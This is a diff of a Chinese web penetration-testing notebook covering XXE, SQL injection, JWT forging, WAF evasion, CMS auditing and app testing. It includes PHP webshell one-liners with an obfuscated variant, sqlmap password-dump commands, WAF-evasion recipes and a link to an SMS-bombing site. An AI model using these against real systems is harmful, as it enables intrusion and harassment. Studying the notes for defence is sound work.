  * 如果php5 php3 phtml..没有定义到后名单里，可以用这格式绕过限制值得注意的点是，如果目标网站的程序员修改了设置执行这种代码的文件（默认是开启的，脚本可执行的），你就无法执行该文件，上传的脚本就像一个文本一样躺在那里
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709010254367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2559,11 +2650,13 @@ wordpress，phpcms
 
 
 ### 文件删除
+
 文件删除黑盒测试很难看到一般都是白盒测试。因为你要删除文件很难用到特定的函数去执行。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717211623270.png)
 
 unlink，delfile是php中对应删除的函数
 删除数据库安装文件，可以重装数据库。
+
 ## 逻辑越权
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712191714272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2628,8 +2721,11 @@ unlink，delfile是php中对应删除的函数
 5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤
 
 ### 登录脆弱
+
 #### 验证脆弱
+
 ##### 待补充：Token爆破
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713162605889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ##### 验证码破解
@@ -2650,6 +2746,7 @@ unlink，delfile是php中对应删除的函数
 
 
 ###### 弱验证码绕过
+
 **观察**
 验证码破解你首先要仔细观察数据包，且要分别尝试对方网站收到正确的验证码和错误的验证码时，网站的返回差异。并获得相关攻破点，比如长度太短等
 
@@ -2673,6 +2770,7 @@ unlink，delfile是php中对应删除的函数
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713135502447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ###### 识别绕过
+
 有的验证码数据包进行了一次修改，验证码就变更了，这时候就需要做识别绕过
 
 字符验证码：
@@ -2801,6 +2899,7 @@ php中有一个转义字符
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210511175404953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## 待整理：XXE
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714132151577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -2813,10 +2912,14 @@ XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XX
 [【FreeBuf字幕组】WEB安全漏洞介绍-XML外部实体注入攻击（XXE）](https://www.bilibili.com/video/BV1at41177SA/)
 
 ### XXE 攻击
+
 #### 自动攻击工具
+
 XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
 工具地址 https://github.com/enjoiz/XXEinjector
+
 #### 手动攻击
+
 **人工嗅探**
 burpsuite爬取后，搜索关键词content-type看对应的值是否有/xml关键字。有的话代表接受XML数据.没有的话看是否能修改成传输XML的格式，即application/xml或text/xml
 
@@ -2825,18 +2928,24 @@ burpsuite爬取后，搜索关键词content-type看对应的值是否有/xml关�
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134047639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 **加载payload**
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134317702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 #### payload
 
 ##### 读取文件
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714121854241.png)
 
 ##### 内网、ip、文件探测
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714122215349.png)
 
 ##### 引入外部实体DTD
+
 通过将关键代码放在dtd里可以使得上传的xml文本免于管理员的检测
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071412303340.png)
+
 ##### 无回显读取文件
+
 如果目标站点没有回显，就将目标站点的文件直接请求到自己服务器
 注意这里额外多使用了个base64加密是因为这是php文件读取的方法，php读取文件就不必在写全目录了(当然写全也无可厚非，如下图就是写全的)，如果是同级目录下就是test.txt
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714124614593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2875,6 +2984,7 @@ oob
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604131802628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### XXE 亿笑攻击-DOS
+
 第一次进行这种攻击时，攻击者使用lol作为实体数据，并在随后的几个实体中多次调用它。执行时间呈指数级增长，结果是一次成功的 DoS 攻击导致网站瘫痪。由于使用 lol 并多次调用它导致了数十亿个请求，我们得到了“Billion Laugh Attack”这个名字
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115827776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 在这里，我们看到在1 处，我们已经声明了名为“ ignite”的实体，然后在其他几个实体中调用了 ignite，从而形成了一个回调链，这将使服务器过载。在2 处，我们调用了实体&ignite9; 我们已经调用 ignite9 而不是 ignite，因为 ignite9 多次调用 ignite8，每次调用 ignite8 时都会启动 ignite7，依此类推。因此，请求将花费指数级的时间来执行，结果，网站将关闭。
@@ -2883,6 +2993,7 @@ oob
 
 
 ### 防御
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## RCE（远程命令执行）
@@ -2935,6 +3046,7 @@ id存在注入点，page不存在。这时候你的注入应该采取以下策�
 ```bash
 url/?id=1*&page=2
 ```
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715234717488.png)
 
 
@@ -3254,6 +3366,7 @@ sqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密
 sqlmap -u URL --current-db
 sqlmap -u URL --current-user
 ```
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)
 你可以点击以下文章以便了解更多使用
 [这篇热门文章对sqlmap做了详细的解释](https://www.freebuf.com/sectool/164608.html)
@@ -3503,6 +3616,7 @@ SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A
 
 
 #### 二次注入
+
 二次注入通常需要利用insert和update，当过滤魔术方法时，insert语句通常会将转义的字符在数据库中自动还原通过再次取出相应的词就可以逃逸魔术方法了。另外如果存在此漏洞还可以进行任意用户的密码修改等。
 下图是魔术方法逃逸
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707121240712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3523,6 +3637,7 @@ SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A
 查看源码
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125644184.png)
 实践一下二次注入修改管理员admin密码吧，未补全网址： http://book.colapl
+
 ### 注入拓展
 
 #### dnslog带外注入
@@ -3876,6 +3991,7 @@ unicode网络编码
 </script>
 
 
+
 我们会想到，需要使用闭合双引号的方法：
 
 gb.php?x=1";alert(1)//
@@ -4015,6 +4131,7 @@ BurpSuite中的一个Tricks：不修改参数，直接重放数据包，对于�
 
 
 短信轰炸网站，输入电话号码即可 https://sg.iculture.cc/message/d.html
+
 ## DDOS 攻击
 
 NTP DDOS 的原理
@@ -4057,56 +4174,105 @@ NTP DDOS 的原理
 >SYN攻击利用的是TCP的三次握手机制，攻击端利用伪造的IP地址向被攻击端发出请求，而被攻击端发出的响应 报文将永远发送不到目的地，那么被攻击端在等待关闭这个连接的过程中消耗了资源，如果有成千上万的这种连接，主机资源将被耗尽，从而达到攻击的目的。
 
 
-你可以在使用LOIC测试前，去https://tool.chinaz.com/speedtest.aspx 网站查看一下目标网站速度。在使用LOIC后再去对比目标网速是否有变化。
-
 
 
 
 # 经验积累
 
-## CMS漏洞
+中间件漏洞请阅读《WEB常见中间件漏洞》
+
+## CMS特性
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071520534055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 知名的第三方工具网上是有专门的扫描器的，这相比于通用的扫描得会更及时更经常。如果没有你就想办法弄源码下来，弄到之后先采用一键代码设计软件进行扫描漏洞，扫描不出就去看看源码找0day
 
-如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就视情况而定了
+如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就通常采用常规测试
+
 ### 敏感信息搜集
+
 **搜索引擎搜敏感词**
 框架+爆破目录
-框架+历史漏洞 github
 框架+漏洞利用/拿shell
 框架+弱口令
+
+**github**
+框架+历史漏洞 github
+框架github看发布修复了哪些漏洞，就大概能对历史漏洞有全貌了解
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718135824694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+发现相关漏洞之后进入commit就知道这个漏洞到底发生在哪些语句
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ### 工具
+
 #### 利用
+
 wordpress:wpscan(kali内置)
 thinkphp:thinkphppayload
+
 #### 弱口令
+
 snetcraker:国内开发的，使用起来简单,但仅支持远程协议的爆破破解如mysql，redis等。如果是网页登录需要用burpsuit爆破提交数据包的
 hydra:国外开发的，kali集成
+
 ### thinkphp5
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071812320635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+启动界面如图所示  :）![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718123314499.png)
+
 #### 特性
+
+**访问调用**
 支持在url访问文件的函数，写法是url/文件名（如果是index.php可以省略不写）/目录
 /类名（没有类可忽略）/函数名
 支持在url访问文件的参数，写法是url/文件名/目录
 /类名（没有类名可忽略）/函数名/参数名/1
 
+以上方法定义的访问一般至少网页url层有3层。如果是定义路由route文件,重新自定义了访问，访问就更隐蔽了，如下是一个route.php文件的定义。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718132543794.png)
+
+
 利用好上述特性，你在访问时就可以直接调用内在函数
+
+**开启调试模式**
+直接在config中就可以开启调试，这为审计提供了便利。一般在审计时通常会开启，开启方法很简单都以下两个值都设置为true
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718130329347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718133002578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+****
+
+利用tp5的特性在代码审计时，应先查看route文件，再将调试打开，以最快的定位页面文件位置
+
+#### 历史漏洞
+
+tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln
+
+
 ### dedecms
+
 #### 基本信息
+
 介绍市场份额、经典界面、漏洞、平台更新速度、版本差别
+
 #### 敏感信息
+
 **后台目录**
 /dede
 更多请看http://wap.dedexuexi.com/dedejiaocheng/azsy/1136.html
 
 
 ## 语言特性
+
 ### PHP
+
 php_getshell.exe
+
 #### 变量覆盖漏洞
+
 顾名思义，自定义的变量替换原有变量的情况称为变量覆盖漏洞
 
 主要涉及的函数有以下四个：
+
 ```bash
 extract() 
 parse_str() 
@@ -4126,19 +4292,28 @@ parse_str()函数用于把查询字符串解析到变量中，如果没有array�
 import_request_variables()使用不当
 import_request_variables将GET/POST/COOKIE变量导入到全局作用域中
 import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候 
-### JAVA
+
+### JAVAWEB
+
+更多请查看《攻击javaweb应用》
+
 #### 与SQL注入有关的预编译
+
 在SQL注入中java要比PHP漏洞少得多，因为其数据库查询通常会写成预编译。
 
 **预编译**
 一般JAVA中常见预编译，不过其他语言也是可以写出来的
-使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已
+使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。如下图当java定义接收的参数为？这就代表使用了预编译。注释的就是没有预编译的，通常就可能存在安全漏洞
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718143651696.png)
+
+在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已
 
 case when带入SQL语句可以绕过，但这种只有对方服务器源代码有order by才能奏效。含有order by的网页一般都有排序功能。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)
 
 #### JSON WEB TOKEN
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714150644539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714181545725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -4151,6 +4326,7 @@ JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以�
 JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
 
 #####  破解
+
 **对方服务器允许签名为空**
 将头部解密之后值改为none（改为none即不要密钥的意思），在进行编码成base64，声明值看你是否需要修改相应参数来确定是否修改，（一般会修改用户名和身份过期时间的时间戳），删除签名。如果你是GET请求的数据包你在修改时应充分考虑base64特殊字符 + = / 与url编码兼容问题。常见的base64传输的=应该删掉
 
@@ -4170,10 +4346,25 @@ JWT攻击取决于对方服务器是接收数据来进行什么样的下一步�
 
 ## WAF绕过
 
-你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
+很多web都有WAF，会对恶意访问者做一定的拦截和记录。你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
+在学习WAF绕过时，最深度学习的方式是将想分析的WAF下载到电脑，弄一个网站，开着WAF自己跟自己玩。
 
 
-### 基本知识
+**waf类型**
+
+硬件、软件、云
+**waf检测工具**
+
+1. wafw00f
+2. sqlmap
+   相较于手工和wafw00f而言，sqlmap业界认可度更高，用的人更多
+
+```bash
+sqlmap.py -u "url" --identify-waf --batch
+```
+
+
+**简单概述WAF绕过**
 WAF绕过将会更难了，这些绕过都是有条件的。
 
 1.扫描速度（代理池，延迟，白名单）
@@ -4181,32 +4372,44 @@ WAF绕过将会更难了，这些绕过都是有条件的。
 3.漏洞payload（数据变异，数据加密，白名单）
 	碰到WAF多换几个工具
 	代理发送burpsuite，鼠标点击器扫
+
 #### 市面上WAF
+
 受欢迎的 WAF 供应商       
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716181640870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ##### 阿里云盾
+
 买阿里云就有阿里云盾默认开启。WAF收费版只是有自定义的不同，功能上都差不多。阿里云检测苛刻，稍微不注意就暂时被封了，比如扫目录会被封一个小时样子。
+
 ##### 宝塔
+
 一般非法网站都会用宝塔一站式搭建，所以一般这类网站就是宝塔防护。绕过难度：难
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707225447286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716175129396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ##### 安全狗
+
 安全狗用的人也挺多的，但是他的防护效果不如其他防护软件好。因为历史悠久且免费所以使用的人多。绕过难度：简单
 以下是安全狗默认开启和关闭的选项，按道理来说全部开启网站更安全，但是为了防止正常请求被错误拦截，这里是没有全部开启的
+安全狗官方下载链接 https://www.safedog.cn/server_safedog.html
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ##### 人工智能WAF
+
 #### 市面上常见绕过工具
+
 检查和绕过 WAF 的工具：
 w3af — Web 应用程序攻击和审计框架
-
-wafw00f — 识别和指纹 Web 应用程序防火墙
 
 BypassWAF –通过滥用 DNS 历史绕过防火墙。此工具将搜索旧的 DNS A 记录并检查服务器是否回复该域。 
 
 CloudFail – 是一种战术侦察工具，试图找到 Cloudflare WAF 背后的原始 IP 地址。
+
 ### 通用
+
 #### 待补充：全扫描工具
+
 **待补充如何伪造成用户，来骗过WAF指纹识别？**
 对方开了WAF这些扫描工具通常会被识别拦截
 AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫
@@ -4217,11 +4420,13 @@ AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫
 用burpsuite劫持，然后用按键精灵或模拟器控制速度或多工具联动扫描，将数据联动到可控制速度的。如三连动，awvs发送到burpsuite，再发送到xray上
 
 #### 流量监控
+
 **宝塔**
 60秒内，请求同一URL超过120次，封锁IP 100秒。
 60秒内，恶意请求6次，封IP 600秒。
 
 ##### 躲避
+
 **方案1：延迟扫描**
 一般设置3秒起，这会大大降低你的访问速度
 
@@ -4237,29 +4442,37 @@ AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫
 
 
  python代理请求关键代码
+
 ```c
 requests.get(urls,headers=hearders,proxies=proxy)
 ```
 
 ##### 经验
+
 阿里云：不能设置爬虫请求头，只能设置代理池或者延时3秒
 BT：扫描字典不能有敏感文件如bak等，这就要用文件上传绕过策略了
 
 
 
 ### SQL绕过
+
 宝塔：拦截方式/*
+
 #### 默认未开启的防御绕过
+
 ##### sqlmap
+
 如需sqlmap注入，修改us头，加入代理池防止CC拦截，自写Tamper脚本
 
 ```bash
 # waf.py 是自己写的
 sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 ```
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716230027420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ##### 手动
+
 主要利用安全狗是整段语句检测的，而SQL是逐步执行的
 **情况：目标网站允许接收其他请求方式；方法：post提交+敏感语句处理**
 当安全狗拒绝你直接用 `id=1 and 1=1 `直接插入在url的get请求中,你试着将其用在post请求中图是因为加了database所以被墙了。
@@ -4331,7 +4544,9 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 * 采用此方法你应该查看目标网站可以加解密的方式
 
 结合其他漏洞绕过
+
 ### 权限控制拦截
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716204132902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -4350,6 +4565,7 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 	$b(base64_decode($_POST['z']))		# assert($_POST['z'])
 ?>
 ```
+
 **加密**
 或用php加密 http://www.phpjm.net/，或冰蝎自带加密
 
@@ -4360,7 +4576,9 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 菜刀：未更新状态，无插件，单向加密传输
 蚁剑：更新状态，有插件，扩展性强，单向加密传输
 冰蝎：更新状态，未知插件，双向加密传输（请求时加密，返回数据包时加密，以防止被拦截或赤裸的日志记录） 
+
 ### 其他绕过总结
+
 **base64被拦截**
 这里主要说说怎么去考虑替换编码。因为你输入phpinfo是会报错的，通常在输入base64_decode也会被宝塔拦截。那么你就试试其他可逆编码方式？
 或关键词替换、拼接、php变量套用。。
@@ -4370,7 +4588,8 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 ..\    ..../     ..\.\等
 
 
-## 一句话木马
+## 木马
+
 有一个典型场景，当挖掘到一个潜在的上传漏洞，辛辛苦苦绕过了WAF，结果只上传一个一句话目标，这很可能直接出发主机层面的webshell文件警告，导致功亏一篑。一句话木马通常只有当你用在只是耍耍对面服务器时才用。
 
 ```bash
@@ -4380,6 +4599,9 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 # 效果与eval类似，但这个词没有eval这么敏感
 <?php assert($_POST['x'])?>
 ```
+
+也可参见利用msfvenon生成木马
+
 ## 密码
 
 如果您想防止攻击者使用他们窃取的密码攻击您，组织或用户可以采取一些步骤。您或您的组织可以采取的第一步是实施多重身份验证 (MFA)。考虑 MFA 的最简单方法是使用您知道的东西、您拥有的东西或您要执行身份验证的东西。“您拥有的东西”可以是智能手机上的身份验证服务，也可以是物理设备，例如 yubico 密钥。“你知道的东西”就是你的密码。添加“您拥有的东西”这一层会增加利用受损密码的难度，从而增强您的防御能力。如果您的组织需要，可以使用生物识别技术添加一个称为“你是谁”的层
@@ -4394,9 +4616,11 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 
 
 # 系统漏洞
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071422384836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## 工具
+
 ### 探测工具简介
 
 **nmap**
@@ -4409,7 +4633,9 @@ namp --script=vuln 默认nse插件，扫描有局限，如果要用nmap扫描一
 点击新建项目后来到下面这个界面，在用一般会点的高级扫描
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071423333457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714234445162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ### EXP 工具
+
 **网站**
 0day.today 网站公开了大量EXP工具
 exploit.db
@@ -4471,12 +4697,14 @@ shell
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510223458722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510225928292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-msf攻击网络站点需要做反弹或者用公共的服务器。
+msf攻击网络站点需要做反弹或者用公共的服务器
+
 
 
 
 
 # APP漏洞
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715204256707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 APP-> WEB APP->其他 APP->逆向
 
@@ -4503,7 +4731,7 @@ APP-> WEB APP->其他 APP->逆向
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629214132940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
  在抓到相应的http链接后，你很可能遇到的情况是当你直接利用浏览器去访问请求的http时，无法得到你用app返回的数据包，你用浏览器返回的数据包很可能是个报错如403等界面。这时候你需要仔细检查你用APP发送的数据包与你用web发送的数据包异同点，将你的web发送的请求直接改成APP发送的数据包
- 
+
 **获取信息方式2.逆向编译工具**
 漏了个大洞，一键提取，且加了反编译  
 下载 https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw
@@ -4647,11 +4875,6 @@ http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group
 
 # 经验
 
-
-
-
-
-
 ### 攻破类似网站
 
 当你攻破一个网站时，复制并百度其类似的目录结构（打开F12--》network，分析请求地址即可得到），就可以得到同源码搭建的网站。
@@ -4684,10 +4907,6 @@ SEO优化方式劫持搜索引擎结果，引导大众下载恶意软件
 软件、硬件产品在发展的过程中，为了提升产品体验、升级能力、修复 BUG 等，需要进行更新升级，供应商因此建设有配套的更新升级系统。黑客通过自身的攻击能力与掌握的漏洞，对供应商发起攻击与横向渗透，最中取得升级系统的控制权。利用窃取或伪造证书签名的软件更新，将恶意软件带进攻
 
 
-
-## 密码
-
-https://www.somd5.com/
 
 ### windows密码获取和破解
 
@@ -4730,6 +4949,7 @@ cat /etc/passwd
 对邮箱反查后的站点进行访问后得到。
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520164745383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ### 溯源
 
 这个技巧可以用在获得更多信息中或者人肉，也可以用在反攻击中，即找出黑客是谁。
@@ -4982,42 +5202,357 @@ https://tools.ipip.net/dns.php
 13. 修改host文件中的www.xxx.com和xxx.com文件，用ping确定后再访问看能否打开网页
 14. 直接在网页中访问IP地址  
 
-## WAF
 
-一般的网站都有waf，这是因为不少waf都开放免费端口。市面上有很多waf，但是原理都差不多
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629184325358.png)
 
-很多web都有WAF，会对恶意访问者做一定的拦截和记录
